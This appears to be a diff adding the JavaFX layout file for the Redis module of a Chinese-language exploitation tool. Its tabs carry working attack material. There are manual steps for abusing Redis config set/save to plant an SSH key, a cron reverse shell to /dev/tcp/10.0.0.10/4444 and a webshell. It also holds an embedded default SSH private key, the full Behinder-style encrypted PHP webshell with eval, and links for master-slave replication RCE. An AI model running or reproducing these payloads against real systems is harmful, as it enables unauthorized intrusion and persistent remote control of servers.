@@ -1,0 +1,288 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<?import javafx.scene.shape.*?>
+<?import javafx.geometry.*?>
+<?import javafx.scene.text.*?>
+<?import java.lang.*?>
+<?import java.util.*?>
+<?import javafx.scene.*?>
+<?import javafx.scene.control.*?>
+<?import javafx.scene.layout.*?>
+
+<GridPane fx:id="basePanel" hgap="10.0" vgap="10.0" xmlns="http://javafx.com/javafx/8" xmlns:fx="http://javafx.com/fxml/1" fx:controller="org.fasnow.mutiple.ui.controller.RedisController">
+   <children>
+      <TabPane fx:id="tabs" focusTraversable="false" style="height: 100%;" tabClosingPolicy="UNAVAILABLE" GridPane.rowIndex="3">
+         <tabs>
+            <Tab fx:id="descTab" text="漏洞说明">
+               <content>
+                  <TextArea fx:id="description" focusTraversable="false" text="******&#10;手工不要使用Another Redis DeskTop Manager工具（其他redis工具没试过）执行命令，会有意想不到的问题，推荐使用redis-cli&#10;******&#10;&#10;手工写入公钥&#10;config set dir /root/.ssh&#10;config set dbfilename authorized_keys&#10;set x &quot;\n\n&lt;公钥&gt;\n&quot; 注意前缀最好设置两个\n\n，测试过程过前缀只设置一个\n导致无法私钥登录&#10;save&#10;ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /path/private_key user@hostname &#10;&#10;手工写入计划任务反弹shell&#10;******&#10;CentOS操作系统计划任务为/var/spool/cron/&lt;username&gt;&#10;Debian/Ubuntus系列操作系统计划任务为/var/spool/cron/crontabs/&lt;username&gt;&#10;******&#10;config set dir /var/spool/cron&#10;config set dbfilename root&#10;set y &quot;\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.0.0.10/4444&lt;&amp;1\n&quot;&#10;save&#10;&#10;手工写入webshell&#10;config set dir /var/www/html&#10;config set dbfilename shell.jsp&#10;set z &quot;\n\n&lt;webshell&gt;\n\n&quot;&#10;save&#10;&#10;" wrapText="true" />
+               </content>
+            </Tab>
+            <Tab text="日志">
+               <content>
+                  <TextArea fx:id="detectLog" focusTraversable="false" wrapText="true" />
+               </content>
+            </Tab>
+            <Tab text="Redis命令执行">
+               <content>
+                  <GridPane hgap="10.0" vgap="10.0">
+                    <columnConstraints>
+                      <ColumnConstraints hgrow="ALWAYS" />
+                    </columnConstraints>
+                    <rowConstraints>
+                      <RowConstraints vgrow="NEVER" />
+                      <RowConstraints minHeight="10.0" prefHeight="30.0" vgrow="SOMETIMES" />
+                    </rowConstraints>
+                     <children>
+                        <HBox alignment="CENTER" spacing="10.0">
+                           <children>
+                              <Label text="命令" />
+                              <TextField fx:id="cmdField" prefWidth="400.0" />
+                              <Button fx:id="cmdSubmitBtn" mnemonicParsing="false" onAction="#cmdSubmitBtnAction" text="执行" />
+                           </children>
+                        </HBox>
+                        <SplitPane dividerPositions="0.3" prefHeight="200.0" prefWidth="200.0" GridPane.rowIndex="1">
+                           <items>
+                              <TextArea prefHeight="200.0" prefWidth="200.0" text="获取基本信息         info    &#10;获取dump目录      config get dir    &#10;获取dump文件名   config get dbfilename    &#10;设置dump目录      config set dir &lt;value&gt;   &#10;设置dump文件名   config set dbfilename &lt;value&gt;   " />
+                              <TextArea fx:id="cmdExecLog" prefHeight="200.0" prefWidth="200.0" />
+                           </items>
+                        </SplitPane>
+                     </children>
+                     <padding>
+                        <Insets top="10.0" />
+                     </padding>
+                  </GridPane>
+               </content>
+            </Tab>
+            <Tab text="批量检测">
+               <content>
+                  <GridPane hgap="10.0" vgap="10.0">
+                     <children>
+                        <TextArea fx:id="batchDetectLog" focusTraversable="false" style="overflow-x: false;" wrapText="true" GridPane.hgrow="ALWAYS" GridPane.rowIndex="1" GridPane.vgrow="ALWAYS" />
+                        <HBox alignment="CENTER" spacing="10.0" GridPane.halignment="CENTER" GridPane.hgrow="ALWAYS" GridPane.valignment="CENTER" GridPane.vgrow="NEVER">
+                           <children>
+                              <Label text="文件路径" />
+                              <TextField fx:id="fileField" editable="false" focusTraversable="false" prefWidth="400.0" />
+                              <Button fx:id="importBtn" focusTraversable="false" mnemonicParsing="false" onAction="#importBtnAction" text="导入" HBox.hgrow="ALWAYS" />
+                              <Label text="线程" />
+                              <TextField fx:id="threadField" focusTraversable="false" prefWidth="50.0" text="10" />
+                              <Button fx:id="batchSubmitBtn" focusTraversable="false" mnemonicParsing="false" onAction="#batchSubmitBtnAction" text="检测" />
+                           </children>
+                           <GridPane.margin>
+                              <Insets left="10.0" right="10.0" />
+                           </GridPane.margin>
+                        </HBox>
+                     </children>
+                     <columnConstraints>
+                        <ColumnConstraints hgrow="ALWAYS" />
+                     </columnConstraints>
+                     <padding>
+                        <Insets top="10.0" />
+                     </padding>
+                     <rowConstraints>
+                        <RowConstraints valignment="CENTER" vgrow="NEVER" />
+                        <RowConstraints vgrow="SOMETIMES" />
+                     </rowConstraints>
+                  </GridPane>
+               </content>
+            </Tab>
+            <Tab text="私钥写入">
+               <content>
+                  <GridPane hgap="10.0" vgap="10.0">
+                     <children>
+                        <HBox alignment="CENTER" spacing="10.0" GridPane.vgrow="NEVER">
+                           <children>
+                              <Label text="目标.ssh目录" />
+                              <TextField fx:id="sshAuthorizedKeysField" text="/root/.ssh" />
+                              <Button fx:id="writeSSHPubkeyBtn" mnemonicParsing="false" onAction="#writeSSHPubkeyBtnAction" text="写入" />
+                              <Label text="会覆盖authorized_keys文件" />
+                           </children>
+                           <GridPane.margin>
+                              <Insets left="10.0" right="10.0" top="10.0" />
+                           </GridPane.margin>
+                        </HBox>
+                        <SplitPane dividerPositions="0.5" prefHeight="160.0" prefWidth="200.0" GridPane.rowIndex="1">
+                          <items>
+                              <SplitPane dividerPositions="0.5" orientation="VERTICAL">
+                                 <items>
+                                    <TextArea fx:id="sshPubkeyField" promptText="默认公钥" text="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMslTLUdFmDQCy404d5orpY0eT10g4wX5YRHdEUWzpn2 user@host&#10;" />
+                                    <TextArea promptText="默认私钥" text="-----BEGIN OPENSSH PRIVATE KEY-----&#10;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW&#10;QyNTUxOQAAACDLJUy1HRZg0AsuNOHeaK6WNHk9dIOMF+WER3RFFs6Z9gAAAJBuncw9bp3M&#10;PQAAAAtzc2gtZWQyNTUxOQAAACDLJUy1HRZg0AsuNOHeaK6WNHk9dIOMF+WER3RFFs6Z9g&#10;AAAEATDYGGcujR1moa0zBRYUVwq91EjdUjm4kedH2gw59CTcslTLUdFmDQCy404d5orpY0&#10;eT10g4wX5YRHdEUWzpn2AAAACXVzZXJAaG9zdAECAwQ=&#10;-----END OPENSSH PRIVATE KEY-----&#10;" />
+                                 </items>
+                              </SplitPane>
+                              <TextArea fx:id="writeSSHPubkeyLog" prefHeight="498.0" prefWidth="762.0" />
+                          </items>
+                        </SplitPane>
+                     </children>
+                     <columnConstraints>
+                        <ColumnConstraints hgrow="SOMETIMES" />
+                     </columnConstraints>
+                     <rowConstraints>
+                        <RowConstraints vgrow="NEVER" />
+                        <RowConstraints minHeight="10.0" prefHeight="30.0" vgrow="SOMETIMES" />
+                     </rowConstraints>
+                  </GridPane>
+               </content>
+            </Tab>
+            <Tab text="计划任务反弹shell">
+               <content>
+                  <GridPane alignment="CENTER" hgap="10.0" vgap="10.0">
+                     <children>
+                        <TextArea fx:id="cronShellLog" text="*******&#10;CentOS操作系统计划任务为/var/spool/cron/&lt;username&gt;&#10;Debian/Ubuntus系列操作系统计划任务为/var/spool/cron/crontabs/&lt;username&gt;&#10;清除计划任务操作会将Redis缓存覆盖写入对应目标文件以达到清除反弹shell效果&#10;******&#10;" GridPane.rowIndex="1" />
+                        <HBox alignment="CENTER" spacing="10.0">
+                           <children>
+                              <Label text="计划任务" />
+                              <TextField fx:id="reverseShellField" prefWidth="400.0" text="*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/10.0.0.10/4444&lt;&amp;1" />
+                              <TextField fx:id="cronDirField" promptText="计划任务目录" text="/var/spool/cron" />
+                              <TextField fx:id="currentUserField" prefWidth="100.0" promptText="当前用户" text="root" />
+                              <Button fx:id="reverseShellSubmitBtn" mnemonicParsing="false" onAction="#reverseShellSubmitBtnAction" text="执行" />
+                              <Button fx:id="clearReverseShellBtn" mnemonicParsing="false" onAction="#clearReverseShellBtnAction" text="清除写入的计划任务" />
+                              <Label text="均会覆盖计划任务" />
+                           </children>
+                           <GridPane.margin>
+                              <Insets left="10.0" right="10.0" />
+                           </GridPane.margin>
+                        </HBox>
+                     </children>
+                     <columnConstraints>
+                        <ColumnConstraints hgrow="SOMETIMES" />
+                     </columnConstraints>
+                     <padding>
+                        <Insets top="10.0" />
+                     </padding>
+                     <rowConstraints>
+                        <RowConstraints valignment="CENTER" vgrow="NEVER" />
+                        <RowConstraints vgrow="ALWAYS" />
+                     </rowConstraints>
+                  </GridPane>
+               </content>
+            </Tab>
+            <Tab text="webshell写入">
+               <content>
+                  <GridPane hgap="10.0" vgap="10.0">
+                    <columnConstraints>
+                      <ColumnConstraints hgrow="SOMETIMES" />
+                    </columnConstraints>
+                    <rowConstraints>
+                      <RowConstraints vgrow="NEVER" />
+                      <RowConstraints vgrow="SOMETIMES" />
+                    </rowConstraints>
+                     <children>
+                        <SplitPane dividerPositions="0.5" prefHeight="200.0" prefWidth="200.0" GridPane.rowIndex="1">
+                           <items>
+                              <TextArea fx:id="webshellField" text="&lt;?php&#10;@error_reporting(0);&#10;session_start();&#10;    $key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond&#10;    $_SESSION['k']=$key;&#10;    $post=file_get_contents(&quot;php://input&quot;);&#10;    if(!extension_loaded('openssl'))&#10;    {&#10;        $t=&quot;base64_&quot;.&quot;decode&quot;;&#10;        $post=$t($post.&quot;&quot;);&#10;&#10;        for($i=0;$i&lt;strlen($post);$i++) {&#10;                 $post[$i] = $post[$i]^$key[$i+1&amp;15]; &#10;                }&#10;    }&#10;    else&#10;    {&#10;        $post=openssl_decrypt($post, &quot;AES128&quot;, $key);&#10;    }&#10;    $arr=explode('|',$post);&#10;    $func=$arr[0];&#10;    $params=$arr[1];&#10;    class C{public function __invoke($p) {eval($p.&quot;&quot;);}}&#10;    @call_user_func(new C(),$params);&#10;?&gt;" />
+                              <TextArea fx:id="writeWebshellLog" />
+                           </items>
+                        </SplitPane>
+                        <HBox alignment="CENTER" spacing="10.0">
+                           <children>
+                              <Label text="网站路径" />
+                              <TextField fx:id="webpath" prefWidth="300.0" text="/var/www/html" />
+                              <Label text="文件名" />
+                              <TextField fx:id="weshellFilenameField" prefWidth="100.0" text="shell.jsp" />
+                              <Button fx:id="writeWebshellBtn" mnemonicParsing="false" onAction="#writeWebshellBtnAction" text="写入" />
+                           </children>
+                           <GridPane.margin>
+                              <Insets top="10.0" />
+                           </GridPane.margin>
+                        </HBox>
+                     </children>
+                  </GridPane>
+               </content>
+            </Tab>
+            <Tab text="主从复制利用">
+               <content>
+                  <GridPane hgap="10.0" vgap="10.0">
+                    <columnConstraints>
+                      <ColumnConstraints hgrow="SOMETIMES" />
+                    </columnConstraints>
+                    <rowConstraints>
+                      <RowConstraints vgrow="NEVER" />
+                      <RowConstraints vgrow="NEVER" />
+                      <RowConstraints minHeight="10.0" prefHeight="30.0" vgrow="SOMETIMES" />
+                    </rowConstraints>
+                     <children>
+                        <HBox alignment="CENTER" spacing="10.0">
+                           <children>
+                              <Label text="Fake Server" />
+                              <Label text="本地地址" HBox.hgrow="NEVER" />
+                              <ComboBox fx:id="localhostCB" editable="true" prefWidth="150.0" />
+                              <Label text="本地端口" />
+                              <TextField fx:id="localportField" prefWidth="100.0" />
+                              <Button fx:id="replicationBtn" mnemonicParsing="false" onAction="#replicationBtnAction" text="利用" />
+                           </children>
+                           <GridPane.margin>
+                              <Insets left="10.0" right="10.0" />
+                           </GridPane.margin>
+                        </HBox>
+                        <VBox alignment="CENTER" fillWidth="false" spacing="10.0" GridPane.hgrow="NEVER" GridPane.rowIndex="1">
+                           <children>
+                              <TextField editable="false" prefWidth="450.0" text="python脚本：https://github.com/Ridter/redis-rce" />
+                              <TextField editable="false" prefWidth="450.0" text="so文件：https://github.com/Ridter/RedisModules-ExecuteCommand" />
+                           </children>
+                        </VBox>
+                        <TextArea fx:id="replicationLog" prefHeight="200.0" prefWidth="200.0" GridPane.rowIndex="2" />
+                     </children>
+                     <padding>
+                        <Insets top="10.0" />
+                     </padding>
+                  </GridPane>
+               </content>
+            </Tab>
+         </tabs>
+      </TabPane>
+      <HBox alignment="CENTER_LEFT" spacing="10.0" GridPane.rowIndex="2">
+         <children>
+            <Label text="版本" />
+            <TextField fx:id="versionField" />
+            <Label text="操作系统" />
+            <TextField fx:id="osNameField" prefWidth="200.0" />
+            <Label text="dump目录" />
+            <TextField fx:id="dirField" />
+            <Label text="dump文件" />
+            <TextField fx:id="dbfilenameField" />
+         </children>
+         <padding>
+            <Insets left="10.0" right="10.0" />
+         </padding>
+      </HBox>
+      <HBox alignment="CENTER_LEFT" spacing="10.0" GridPane.vgrow="NEVER">
+         <children>
+            <Label text="主机" />
+            <TextField fx:id="hostField" focusTraversable="false" prefWidth="200.0" text="10.0.0.10" />
+            <Label text="端口" />
+            <TextField fx:id="portField" prefWidth="80.0" text="6379" />
+            <ComboBox fx:id="vulCB1" focusTraversable="false" />
+            <Button fx:id="submitBtn" focusTraversable="false" mnemonicParsing="false" onAction="#submitBtnAction" text="检测" />
+            <HBox alignment="CENTER_LEFT" spacing="10.0">
+               <children>
+                  <Label text="密码">
+                     <HBox.margin>
+                        <Insets />
+                     </HBox.margin>
+                  </Label>
+                  <TextField fx:id="passwordField" prefWidth="200.0" />
+                  <Button fx:id="getInfoBtn" mnemonicParsing="false" onAction="#getInfoBtnAction" text="获取基本信息" />
+               </children>
+               <opaqueInsets>
+                  <Insets />
+               </opaqueInsets>
+            </HBox>
+         </children>
+         <GridPane.margin>
+            <Insets left="10.0" right="10.0" />
+         </GridPane.margin>
+      </HBox>
+   </children>
+   <columnConstraints>
+      <ColumnConstraints halignment="CENTER" hgrow="SOMETIMES" />
+   </columnConstraints>
+   <rowConstraints>
+      <RowConstraints vgrow="NEVER" />
+      <RowConstraints vgrow="NEVER" />
+      <RowConstraints vgrow="NEVER" />
+      <RowConstraints vgrow="SOMETIMES" />
+   </rowConstraints>
+   <padding>
+      <Insets top="10.0" />
+   </padding>
+</GridPane>
